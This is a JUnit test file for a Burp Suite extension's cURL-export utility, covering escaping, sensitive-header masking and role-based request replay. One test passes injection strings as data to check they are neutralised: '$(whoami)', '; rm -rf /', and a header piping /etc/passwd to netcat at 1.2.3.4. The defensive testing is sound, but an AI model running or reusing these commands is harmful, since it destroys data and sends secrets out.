package thorization.report;

import burp.api.montoya.http.message.requests.HttpRequest;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import thorization.model.AuditRecord;
import thorization.model.AuthorizationCheckResult;
import thorization.model.UserRole;
import thorization.model.Verdict;
import thorization.substitution.MockHttpRequestHelper;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;

class CurlUtilsTest {

    @BeforeAll
    static void init() {
        System.setProperty("java.awt.headless", "true");
    }

    @Test
    @DisplayName("Verify standard GET request serialization with query parameters")
    void testBasicGetCommand() {
        HttpRequest req = MockHttpRequestHelper.createMockRequest(
                "https://api.example.com/v1/users?id=10&sort=asc",
                "GET",
                "",
                Map.of("Accept", "application/json", "Host", "api.example.com")
        );

        String curl = CurlUtils.generateCurl(req);

        assertNotNull(curl);
        assertTrue(curl.startsWith("curl --path-as-is -i -s -k"));
        assertTrue(curl.contains("-X GET"));
        assertTrue(curl.contains("'https://api.example.com/v1/users?id=10&sort=asc'"));
        assertTrue(curl.contains("-H 'Accept: application/json'"));
        assertTrue(curl.contains("-H 'Host: api.example.com'"));
        assertFalse(curl.contains("--data"));
    }

    @Test
    @DisplayName("Verify POST request with JSON body uses --data-raw and omits Content-Length")
    void testPostWithJsonBody() {
        HttpRequest req = MockHttpRequestHelper.createMockRequest(
                "https://api.example.com/v1/orders",
                "POST",
                "{\"item\":\"Widget\",\"qty\":5}",
                Map.of(
                        "Content-Type", "application/json",
                        "Content-Length", "28",
                        "X-Custom-Trace", "trace-999"
                )
        );

        String curl = CurlUtils.generateCurl(req);

        assertTrue(curl.contains("-X POST"));
        assertTrue(curl.contains("--data-raw '{\"item\":\"Widget\",\"qty\":5}'"));
        assertTrue(curl.contains("-H 'Content-Type: application/json'"));
        assertTrue(curl.contains("-H 'X-Custom-Trace: trace-999'"));
        // Content-Length must be omitted because curl computes it dynamically
        assertFalse(curl.contains("Content-Length"), "Content-Length header must not be included");
    }

    @Test
    @DisplayName("Verify POSIX shell single-quote escaping in URL, headers, and body")
    void testSingleQuoteEscaping() {
        HttpRequest req = MockHttpRequestHelper.createMockRequest(
                "https://api.example.com/search?q=O'Reilly",
                "POST",
                "{\"notes\":\"Doctor's Prescription for patient's care\"}",
                Map.of("X-User-Title", "O'Connor's Chief")
        );

        String curl = CurlUtils.generateCurl(req);

        // Single quote ' must be escaped as '\''
        assertTrue(curl.contains("O'\\''Reilly"), "URL single quotes must be escaped");
        assertTrue(curl.contains("O'\\''Connor'\\''s Chief"), "Header single quotes must be escaped");
        assertTrue(curl.contains("Doctor's Prescription".replace("'", "'\\''")), "Body single quotes must be escaped");

        // Verify valid bash syntax if bash is present on host
        verifyBashSyntax(curl);
    }

    @Test
    @DisplayName("Verify shell metacharacters are safely neutralized by single quotes")
    void testShellMetacharactersNeutralized() {
        HttpRequest req = MockHttpRequestHelper.createMockRequest(
                "https://api.example.com/exec?cmd=$(whoami)&flag=`id`",
                "POST",
                "Payload with $VAR and ; rm -rf / && echo 'hello'",
                Map.of("X-Injection", "test; cat /etc/passwd | nc 1.2.3.4 9999")
        );

        String curl = CurlUtils.generateCurl(req);

        // Verify bash syntax executes cleanly without executing the injected shell commands
        verifyBashSyntax(curl);
    }

    @Test
    @DisplayName("Verify HTTP/2 pseudo-headers (:method, :path, etc.) are stripped")
    void testHttp2PseudoHeadersSkipped() {
        Map<String, String> headers = new LinkedHashMap<>();
        headers.put(":method", "POST");
        headers.put(":path", "/api/v2/secure");
        headers.put(":authority", "api.example.com");
        headers.put(":scheme", "https");
        headers.put("User-Agent", "Thorization-Audit-Engine");

        HttpRequest req = MockHttpRequestHelper.createMockRequest(
                "https://api.example.com/api/v2/secure",
                "POST",
                "",
                headers
        );

        String curl = CurlUtils.generateCurl(req);

        assertFalse(curl.contains("-H ':method:"), "Pseudo-header :method must be stripped");
        assertFalse(curl.contains("-H ':path:"), "Pseudo-header :path must be stripped");
        assertFalse(curl.contains("-H ':authority:"), "Pseudo-header :authority must be stripped");
        assertFalse(curl.contains("-H ':scheme:"), "Pseudo-header :scheme must be stripped");
        assertTrue(curl.contains("-H 'User-Agent: Thorization-Audit-Engine'"));
    }

    @Test
    @DisplayName("Verify sensitive headers are masked when maskSensitiveHeaders is true")
    void testSensitiveHeaderMasking() {
        Map<String, String> headers = new LinkedHashMap<>();
        headers.put("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token123");
        headers.put("Cookie", "session=abcdef123456; remember=true");
        headers.put("X-Api-Key", "secret-super-key-999");
        headers.put("Accept", "application/json");

        HttpRequest req = MockHttpRequestHelper.createMockRequest(
                "https://api.example.com/api/v1/profile",
                "GET",
                "",
                headers
        );

        String maskedCurl = CurlUtils.generateCurl(req, true);

        assertTrue(maskedCurl.contains("-H 'Authorization: Bearer [REDACTED]'"));
        assertTrue(maskedCurl.contains("-H 'Cookie: [REDACTED]'"));
        assertTrue(maskedCurl.contains("-H 'X-Api-Key: [REDACTED]'"));
        assertTrue(maskedCurl.contains("-H 'Accept: application/json'"));
        assertFalse(maskedCurl.contains("token123"), "Secret token must not leak in masked output");

        String unmaskedCurl = CurlUtils.generateCurl(req, false);
        assertTrue(unmaskedCurl.contains("Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token123"));
        assertTrue(unmaskedCurl.contains("session=abcdef123456; remember=true"));
    }

    @Test
    @DisplayName("Verify AuditRecord with replayed role generates replayed request cURL")
    void testAuditRecordWithReplayedRole() {
        AuditRecord rec = new AuditRecord(101L, null);
        rec.setUrl("https://api.example.com/admin/settings");
        rec.setMethod("POST");

        HttpRequest origReq = MockHttpRequestHelper.createMockRequest(
                "https://api.example.com/admin/settings",
                "POST",
                "{\"orig\":true}",
                Map.of("Authorization", "Bearer admin-token")
        );
        rec.setOriginalRequest(origReq);

        UserRole role = new UserRole("Auditor", "X-Role-Header: auditor-1\nAuthorization: Bearer auditor-token", "cookie=val");
        role.setId("role-auditor");

        HttpRequest replayedReq = MockHttpRequestHelper.createMockRequest(
                "https://api.example.com/admin/settings",
                "POST",
                "{\"orig\":true,\"mutated\":true}",
                Map.of("Authorization", "Bearer auditor-token", "X-Role-Header", "auditor-1", "Cookie", "cookie=val")
        );
        AuthorizationCheckResult checkResult = new AuthorizationCheckResult("role-auditor", "Auditor", Verdict.ENFORCED, 403, 120, 0.2, 50, "Forbidden", replayedReq, null);
        rec.addRoleResult("role-auditor", checkResult);

        String curl = CurlUtils.generateCurl(rec, role);

        assertTrue(curl.contains("Bearer auditor-token"), "Should use replayed role request");
        assertTrue(curl.contains("X-Role-Header: auditor-1"));
        assertTrue(curl.contains("{\"orig\":true,\"mutated\":true}"));
    }

    @Test
    @DisplayName("Verify AuditRecord without replayed result falls back to HeaderUtils.applyRoleHeaders")
    void testAuditRecordUnplayedRoleFallback() {
        AuditRecord rec = new AuditRecord(102L, null);
        rec.setUrl("https://api.example.com/user/10");
        rec.setMethod("GET");

        HttpRequest origReq = MockHttpRequestHelper.createMockRequest(
                "https://api.example.com/user/10",
                "GET",
                "",
                Map.of("Authorization", "Bearer original-token", "Cookie", "orig=session")
        );
        rec.setOriginalRequest(origReq);

        UserRole role = new UserRole("Guest", "Authorization: Bearer guest-token\nX-Tenant: tenant-b", "guest_session=xyz");
        role.setId("role-guest");

        String curl = CurlUtils.generateCurl(rec, role);

        assertTrue(curl.contains("Bearer guest-token"), "Derived request should apply guest role token");
        assertTrue(curl.contains("X-Tenant: tenant-b"));
        assertTrue(curl.contains("Cookie: guest_session=xyz"));
        assertFalse(curl.contains("original-token"), "Original token should be replaced by role");
    }

    @Test
    @DisplayName("Verify AuditRecord unauthenticated role strips auth headers")
    void testAuditRecordUnauthenticatedRole() {
        AuditRecord rec = new AuditRecord(103L, null);
        rec.setUrl("https://api.example.com/api/protected");
        rec.setMethod("GET");

        HttpRequest origReq = MockHttpRequestHelper.createMockRequest(
                "https://api.example.com/api/protected",
                "GET",
                "",
                Map.of("Authorization", "Bearer secret-token", "Cookie", "session=123", "User-Agent", "Mozilla/5.0")
        );
        rec.setOriginalRequest(origReq);

        UserRole unauthRole = new UserRole("Unauthenticated", "", "");
        unauthRole.setId("unauthenticated");

        String curl = CurlUtils.generateCurl(rec, unauthRole);

        assertFalse(curl.contains("Authorization:"), "Auth headers must be stripped for unauthenticated");
        assertFalse(curl.contains("Cookie:"), "Cookie headers must be stripped for unauthenticated");
        assertTrue(curl.contains("User-Agent: Mozilla/5.0"), "Non-auth headers must be preserved");
    }

    @Test
    @DisplayName("Verify single-line vs multiline cURL formats")
    void testSingleLineVsMultiline() {
        HttpRequest req = MockHttpRequestHelper.createMockRequest(
                "https://api.example.com/test",
                "POST",
                "hello world",
                Map.of("Header1", "Value1", "Header2", "Value2")
        );

        String multiline = CurlUtils.generateCurl(req);
        assertTrue(multiline.contains(" \\\n  -X POST"), "Multiline must contain backslash continuations");
        assertTrue(multiline.contains(" \\\n  -H 'Header1: Value1'"));

        String singleLine = CurlUtils.generateCurlSingleLine(req);
        assertFalse(singleLine.contains("\n"), "Single-line command must not contain newlines");
        assertFalse(singleLine.contains("\\"), "Single-line command must not contain backslash line-continuations");
        assertTrue(singleLine.contains("curl --path-as-is -i -s -k -X POST 'https://api.example.com/test'"));
    }

    @Test
    @DisplayName("Verify thorization.util.CurlUtils bridge delegation")
    void testUtilBridgeDelegation() {
        HttpRequest req = MockHttpRequestHelper.createMockRequest(
                "https://api.example.com/bridge",
                "GET",
                "",
                Map.of("X-Bridge", "true")
        );

        assertEquals(CurlUtils.generateCurl(req), thorization.util.CurlUtils.generateCurl(req));
        assertEquals(CurlUtils.toCurlCommand(req), thorization.util.CurlUtils.toCurlCommand(req));
        assertEquals(CurlUtils.generateCurlSingleLine(req), thorization.util.CurlUtils.generateCurlSingleLine(req));
        assertEquals(CurlUtils.escapeBashSingleQuotes("foo'bar"), thorization.util.CurlUtils.escapeBashSingleQuotes("foo'bar"));
    }

    @Test
    @DisplayName("Verify null safety and edge cases")
    void testNullSafety() {
        assertEquals("", CurlUtils.generateCurl((HttpRequest) null));
        assertEquals("", CurlUtils.generateCurl((AuditRecord) null, null));
        assertEquals("''", CurlUtils.escapeBashSingleQuotes(null));
        assertFalse(CurlUtils.isSensitiveHeader(null));
        assertEquals("[REDACTED]", CurlUtils.maskHeaderValue("Authorization", null));
    }

    private void verifyBashSyntax(String command) {
        try {
            Process process = new ProcessBuilder("bash", "-n", "-c", command)
                    .redirectErrorStream(true)
                    .start();
            int exitCode = process.waitFor();
            if (exitCode != 0) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    StringBuilder error = new StringBuilder();
                    while ((line = reader.readLine()) != null) {
                        error.append(line).append("\n");
                    }
                    fail("Bash syntax check failed with exit code " + exitCode + ": " + error);
                }
            }
        } catch (Exception e) {
            // If bash binary is not available or execution is restricted, skip bash syntax execution
        }
    }
}
